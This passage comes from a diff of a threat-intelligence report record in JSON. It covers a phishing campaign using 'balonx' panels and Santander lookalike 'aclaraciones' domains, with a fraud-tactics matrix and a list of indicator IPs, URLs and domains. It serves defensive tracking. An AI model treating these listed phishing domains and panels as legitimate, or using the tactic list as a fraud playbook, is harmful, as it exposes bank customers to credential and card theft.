data-mce-src=\"__IMAGE_6c9836e2f1abb78b4b49d07f25ba042539426233:dea9511288c302a5ddd454a55552690964f0287aa43c04b5cb0fdbff11b6d276_IMAGE__\" /></p><p style=\"text-align:center;\"><i>Authentication Panel of the UCP section - balonxpanelfs[.]xyz/ucp/</i></p><p>&nbsp;</p>",
+ "displayOptions": {
+  "isFavourite": false,
+  "isHidden": false
+ },
+ "evaluation": {
+  "admiraltyCode": "C3",
+  "credibility": 60,
+  "reliability": 60,
+  "severity": "orange",
+  "tlp": "amber",
+  "ttl": null
+ },
+ "expertise": [
+  "Phishing",
+  "Unique_data"
+ ],
+ "files": [
+  {
+   "hash": "24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8",
+   "mime": "image/png",
+   "name": "24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8",
+   "size": 1784414
+  },
+  {
+   "hash": "ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12",
+   "mime": "image/png",
+   "name": "ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12",
+   "size": 1661206
+  },
+  {
+   "hash": "f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76",
+   "mime": "image/png",
+   "name": "f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76",
+   "size": 1366435
+  },
+  {
+   "hash": "56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a",
+   "mime": "image/png",
+   "name": "56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a",
+   "size": 71033
+  },
+  {
+   "hash": "d52e1bba84deff069895fd7d531d27580c59ac6d783e6ea9dcae9a497b601fb7",
+   "mime": "image/png",
+   "name": "d52e1bba84deff069895fd7d531d27580c59ac6d783e6ea9dcae9a497b601fb7",
+   "size": 2499324
+  },
+  {
+   "hash": "1d94cfb6a519c9d5ad893c5e41021f68c1645344b876e3851276368d799ce942",
+   "mime": "image/png",
+   "name": "1d94cfb6a519c9d5ad893c5e41021f68c1645344b876e3851276368d799ce942",
+   "size": 1698364
+  },
+  {
+   "hash": "43ad5f702b4ec8461dcf0e3206d2ef943dbd9cc702104e080bd24257aab8e90f",
+   "mime": "image/png",
+   "name": "43ad5f702b4ec8461dcf0e3206d2ef943dbd9cc702104e080bd24257aab8e90f",
+   "size": 547883
+  },
+  {
+   "hash": "214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9",
+   "mime": "image/png",
+   "name": "214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9",
+   "size": 2937837
+  },
+  {
+   "hash": "971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc",
+   "mime": "image/png",
+   "name": "971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc",
+   "size": 2559659
+  },
+  {
+   "hash": "8278cc2573c9a533e7396456864551f2bf05e70ad0d65f1802c7ae05e8b698eb",
+   "mime": "image/png",
+   "name": "8278cc2573c9a533e7396456864551f2bf05e70ad0d65f1802c7ae05e8b698eb",
+   "size": 307727
+  },
+  {
+   "hash": "f0ba1d886b5de588fe9a5faa2182d296cd032c3b6ebc5dbc5cf046212c472b37",
+   "mime": "image/png",
+   "name": "f0ba1d886b5de588fe9a5faa2182d296cd032c3b6ebc5dbc5cf046212c472b37",
+   "size": 89749
+  },
+  {
+   "hash": "dea9511288c302a5ddd454a55552690964f0287aa43c04b5cb0fdbff11b6d276",
+   "mime": "image/png",
+   "name": "dea9511288c302a5ddd454a55552690964f0287aa43c04b5cb0fdbff11b6d276",
+   "size": 109091
+  }
+ ],
+ "forumsAccounts": [],
+ "fraudMatrix": [
+  {
+   "attackName": "SIP Service with ",
+   "attackPatternId": "attack-pattern--ad478a22-fadf-4bd7-b6f1-a7df125995f9",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Malware",
+   "attackPatternId": "attack-pattern--019868db-5ca1-4a09-81fc-fc5541ac0f7b",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Virtual Phone Number",
+   "attackPatternId": "attack-pattern--69c1dd5e-67a4-4ff1-af5a-ee3f583bf6af",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Virtual Phone Number",
+   "attackPatternId": "attack-pattern--5a614e3f-2959-4e63-a306-11c909e35a11",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Scam Workers",
+   "attackPatternId": "attack-pattern--cddd3d5d-4204-4811-8625-39b2718f2d8f",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Marketplace Scam Proposal",
+   "attackPatternId": "attack-pattern--3a812eb8-2efb-4193-a22c-93a4417767c6",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Phishing Resource",
+   "attackPatternId": "attack-pattern--f7a37894-9777-410a-99dc-f2235f907bec",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Affiliate Phishing Program",
+   "attackPatternId": "attack-pattern--710a0fda-c3ed-4ab7-a295-3024f5d8e8fa",
+   "attackTactic": "resource-development",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Fake application",
+   "attackPatternId": "attack-pattern--e231f51d-c5ca-4dcd-a2e3-8b9e1847fe3e",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Fake Fraud Warning",
+   "attackPatternId": "attack-pattern--e501f6a6-a5c9-4168-a878-693f3b45b74f",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Scam Refund",
+   "attackPatternId": "attack-pattern--06ccbc2a-f613-41a3-96f1-7398efb8a555",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Unblocking Payment Card",
+   "attackPatternId": "attack-pattern--41b8525e-bc7f-4099-8608-2adb34dafd87",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Impersonating Legitimate Client",
+   "attackPatternId": "attack-pattern--59d6e674-c9b4-4d6e-8649-748fcd9975ac",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Pushing to Visit Phishing Resource",
+   "attackPatternId": "attack-pattern--f5cd772e-abc3-4c16-b5ef-2fdc9039dc71",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Enabling Accessibility Service for Malware",
+   "attackPatternId": "attack-pattern--280b1b4f-b39f-4fb6-9112-9b3c8ed360ad",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Pushing to Install RAT",
+   "attackPatternId": "attack-pattern--ed5491a5-f00b-4e2f-bf36-90d4845526bc",
+   "attackTactic": "trust-abuse",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Vishing",
+   "attackPatternId": "attack-pattern--6f942112-61be-429f-a249-a4f01e86b686",
+   "attackTactic": "end-user-interaction",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Pushing to Install Malware",
+   "attackPatternId": "attack-pattern--7edfbd9a-670c-4f49-bf6d-08620b465303",
+   "attackTactic": "end-user-interaction",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Phishing",
+   "attackPatternId": "attack-pattern--26c7a0f8-fe91-4cf4-8c65-bc66ab6c23d3",
+   "attackTactic": "end-user-interaction",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Login/Password Disclosure",
+   "attackPatternId": "attack-pattern--1637aa56-8dd5-498a-b07b-a416dae10cff",
+   "attackTactic": "credential-access",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Card PAN/EXP/CVV Capture",
+   "attackPatternId": "attack-pattern--1be4ba1c-03fe-4451-aea2-3a97835c04a1",
+   "attackTactic": "credential-access",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Screen Capture",
+   "attackPatternId": "attack-pattern--52671ec0-c277-42bd-9aa3-715d38498835",
+   "attackTactic": "credential-access",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "2nd Factor Capture",
+   "attackPatternId": "attack-pattern--aafd31e2-1912-416a-9510-3128411008b7",
+   "attackTactic": "credential-access",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Credentials Capture",
+   "attackPatternId": "attack-pattern--9ca80ff2-fda6-4b3d-b620-e74e5b905732",
+   "attackTactic": "credential-access",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Access from Fraudster Device",
+   "attackPatternId": "attack-pattern--46e7e6c5-6585-4b95-87b9-33c591cf5fc1",
+   "attackTactic": "account-access",
+   "attackType": "fraud_tactics",
+   "params": null
+  },
+  {
+   "attackName": "Account Access on Victim Device",
+   "attackPatternId": "attack-pattern--26c2d788-ab86-4ad5-a655-6f2f8f98cd75",
+   "attackTactic": "account-access",
+   "attackType": "fraud_tactics",
+   "params": null
+  }
+ ],
+ "hasIocs": true,
+ "id": "6c9836e2f1abb78b4b49d07f25ba042539426233",
+ "indicatorMalwareRelationships": [],
+ "indicatorRelationships": [],
+ "indicatorToolRelationships": [],
+ "indicators": [
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-09-14",
+   "dateLastSeen": "2026-09-14",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "b24f131a7db57536decf8785f28ba3c4bc15649e",
+   "ip": [
+    "85.31.235.109"
+   ],
+   "ipScores": [
+    {
+     "ip": "85.31.235.109",
+     "score": 85
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "85.31.235.109"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17936528612189,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "376e0b8a0a5844dd62b29d3f5278bc6a45925293",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://api.ipify.org?format=json",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861082,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://api.ipify.org?format=json"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "e0f200619b30163b584739d2fcdec77ef85a0732",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://api.qrserver.com/v1/create-qr-code/",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861086,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://api.qrserver.com/v1/create-qr-code/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-28",
+   "dateLastSeen": "2026-04-28",
+   "domain": "balonx-panel.xyz",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "3f9eb2146bf9004efbf4b5208f58f9746bc604ff",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://balonx-panel.xyz/balonx",
+    "domain": "balonx-panel.xyz",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861089,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://balonx-panel.xyz/balonx"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2025-11-05",
+   "dateLastSeen": "2026-04-22",
+   "domain": "folioaclaracion.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "a3192975397fde0c1eb032d33c88120cb8dbb121",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "http://folioaclaracion.com/",
+    "domain": "folioaclaracion.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17897889372974,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "http://folioaclaracion.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-01-21",
+   "dateLastSeen": "2026-04-22",
+   "domain": "portalaclaraciones.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "d405fa2ac4ff690ab1f1560439c38ea9e77c7569",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "http://portalaclaraciones.com/",
+    "domain": "portalaclaraciones.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17898314436118,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "http://portalaclaraciones.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "panelbalonx.xyz",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "83a3a8b213974c5399fdd8543fbe80236c0c42f1",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://panelbalonx.xyz/",
+    "domain": "panelbalonx.xyz",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861097,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://panelbalonx.xyz/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "panelbalonx.xyz",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "f3e93a8f54e03cece1672cddfa87486a80a173fd",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://panelbalonx.xyz/18149761",
+    "domain": "panelbalonx.xyz",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861100,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://panelbalonx.xyz/18149761"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-05-13",
+   "dateLastSeen": "2026-05-16",
+   "domain": "santander-aclaracion.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "a1649af5e4b91bf99d5b3277265841ea71079a3b",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://santander-aclaracion.com/",
+    "domain": "santander-aclaracion.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17894887315979,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://santander-aclaracion.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2025-12-19",
+   "dateLastSeen": "2026-04-22",
+   "domain": "balonx.monster",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "8017502f8db12d45bcd3548e34313e291d205f4a",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://balonx.monster/",
+    "domain": "balonx.monster",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17898138034448,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://balonx.monster/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-01-09",
+   "dateLastSeen": "2026-04-22",
+   "domain": "folioaclaraciones.onl",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "0218702828adb63dc6e15965f61ccaa961813ccd",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://folioaclaraciones.onl/",
+    "domain": "folioaclaraciones.onl",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17898256294935,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://folioaclaraciones.onl/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2025-09-29",
+   "dateLastSeen": "2026-04-22",
+   "domain": "digitalaclaraciones.info",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "4886ee17a8caebfaf792b0ff7b1f270a7ed943d5",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://digitalaclaraciones.info/",
+    "domain": "digitalaclaraciones.info",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17897657899394,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://digitalaclaraciones.info/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2025-09-30",
+   "dateLastSeen": "2026-04-22",
+   "domain": "digitalaclaraciones.info",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "621fe27b4fd2a84a24536194cdc06d7095c50a6d",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://digitalaclaraciones.info/12482760",
+    "domain": "digitalaclaraciones.info",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17897660045276,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://digitalaclaraciones.info/12482760"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-01-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "soportedigitalbancario.org",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "7b0d9fe08a8cff3499569bac0cde0939d1fd5f14",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://soportedigitalbancario.org/",
+    "domain": "soportedigitalbancario.org",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17898319520823,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://soportedigitalbancario.org/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-02-26",
+   "dateLastSeen": "2026-04-22",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "2cb9ad505b18d3fb55052eca268fc5e1f2fafa58",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaracionesdigital.us.com/",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861122,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaracionesdigital.us.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-02-23",
+   "dateLastSeen": "2026-04-22",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "6a45b7773ba0e9b7273448be80e3355d97ea6b78",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://digitalaclaraciones.us.com/",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861125,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://digitalaclaraciones.us.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-03-25",
+   "dateLastSeen": "2026-04-22",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "54128e62e868757e02ee8ff6b8bad365281c8058",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaracionesdigitales.us.com/",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861127,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaracionesdigitales.us.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-03-23",
+   "dateLastSeen": "2026-04-22",
+   "domain": "aclaracionesonline.cv",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "81181de0389d4b62de055c180fe2ccc965131ab2",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://aclaracionesonline.cv/",
+    "domain": "aclaracionesonline.cv",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17893957903979,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://aclaracionesonline.cv/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "digitalaclaraciones.info",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "cc74d7da5d8a4ee0f3ee59dc12d7da01e8791b89",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://digitalaclaraciones.info/21509522",
+    "domain": "digitalaclaraciones.info",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 17893817861133,
+   "sources": [
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://digitalaclaraciones.info/21509522"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-10",
+   "dateLastSeen": "2026-04-22",
+   "domain": "santandersoporte.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "8651b05c4df339a31d953b81fd3e3a1f00712dd8",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://santandersoporte.com/",
+    "domain": "santandersoporte.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17894046492846,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://santandersoporte.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-18",
+   "dateLastSeen": "2026-04-22",
+   "domain": "santanderaclaraciones.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "432d804cd7f857a06265e029bc692e43539115b6",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "https://santanderaclaraciones.com/",
+    "domain": "santanderaclaraciones.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "3af416c79b122ae5e69e226b3580128ee98340ca"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17894078397155,
+   "sources": [
+    "dotmagnet",
+    "manual"
+   ],
+   "taIdList": [
+    "2530a2b46223154e3bc70a245138aa3c4eb75446"
+   ],
+   "type": "network",
+   "url": "https://santanderaclaraciones.com/"
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-04-22",
+   "dateLastSeen": "2026-04-22",
+   "domain": "folioaclaraciones.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "2eddd9eb17255f69795e69aa41b7ac7e9d2cc8f5",
+   "ip": [],
+   "ipScores": [],
+   "params": {
